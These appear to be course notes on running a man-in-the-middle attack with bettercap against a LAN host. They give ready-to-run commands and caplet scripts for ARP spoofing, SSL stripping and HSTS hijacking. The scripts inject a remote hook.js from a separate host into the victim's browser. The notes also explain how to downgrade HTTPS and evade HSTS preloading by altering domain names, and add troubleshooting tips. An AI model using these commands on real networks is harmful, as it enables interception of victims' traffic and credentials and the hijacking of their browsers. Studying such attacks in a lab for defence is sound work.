- bettercap -iface eth2  
	- net.probe on  
		- this will start to discover clients on the nework  
	- net.show  
		- this will show you all discovered clients  
	- set arp.spoof.fullduplex true  
		- sends the router and clients a arp spoof attack  
	- set arp.spoof.targets 192.168.86.22  
	- arp.spoof on  
		- This is to start the attack  
  
# Scripting:  
- open leafpad  
- type  
``` sh
net.probe on  
set arp.spoof.fullduplex true  
set arp.spoof.targets 192.168.86.22  
arp.spoof on 
``` 
- save the file as test.cap  
- bettercap -iface eth2 -caplet /root/test.cap  
  
  
# sslstrip:  
- Both of these scripts work  
- The first version is better  
- ver 1  
``` sh
net.probe on  
set arp.spoof.fullduplex true  
set arp.spoof.targets 192.168.86.22  
set http.proxy.sslstrip true  
set http.proxy.injectjs [http://192.168.86.39:3000/hook.js](http://192.168.86.39:3000/hook.js)  
http.proxy on  
arp.spoof on  
```
- ver 2  
``` sh
net.probe on  
set arp.spoof.fullduplex true  
set arp.spoof.targets 192.168.86.22  
set https.proxy.injectjs [http://192.168.86.39:3000/hook.js](http://192.168.86.39:3000/hook.js)  
https.proxy on  
arp.spoof on  
hstshijack/hstshijack 
``` 
  
# There are 2 types of websites that we are trying to bypass here:  
- Websites that use https but are NOT pre-loaded, ie: they are not included in the local list that forces the browser to load the domain over https, in this case we can access the website directly and we should be able to downgrade it to http, examples of these websites are linkedin.com, bbc.com, stackoverflow.com, apple.com, local google domains such as google.ie, google.co.uk, google.us.....etc , here is what I got  
- Now the 2nd type of websites are the pre-loaded websites, these are websites that are included in a list that is stored locally , the web browser checks this list everytime the user loads a website, if the website the user requested is in the list then the browser will refuse to load it unless it is loading over https, therefore we can never downgrade them to http if the user access them directly, our only chance is to hope that the user searches for one of these website using a search engine that is NOT preloaded, and then when the search engine returns the search results we replace the website name with something that is slightly different, like .corn instead of .com, when we do this the browser will think that this website is not in the pre-loaded list and we'll be able to downgrade it, again I tested the following by first going to google.ie , then searching for Facebook and twitter which are both pre-loaded websites.  
  
## Please clear ALL browsing data (cache, history.....etc) before doing the attack, cause bettercap custom hstshijack will fails to bypass https/hsts due to one or more of the following reasons:  
- You missed a tiny step, so please revise the lectures and make sure you do everything as shown.  
- You manually typed https:// in the url bar.  
- You manually configured the dns server in the target machine to 8.8.8.8 or 1.1.1.1 or anything else. You have a browser extension that is stopping this such as https-everywhere or no-javascript.  
- You did not fully remove browsing data, please make sure you check all boxes as shown here  
  
So keep in mind these notes, and try also to do the attack manually meaning that try to execute the commands manually instead of using the spoof.cap just to see if the attack results differs from the previous one, and please disable your Anti-Virus program for the purpose of testing.  

Please don't hesitate to contact if you need anything else.sc: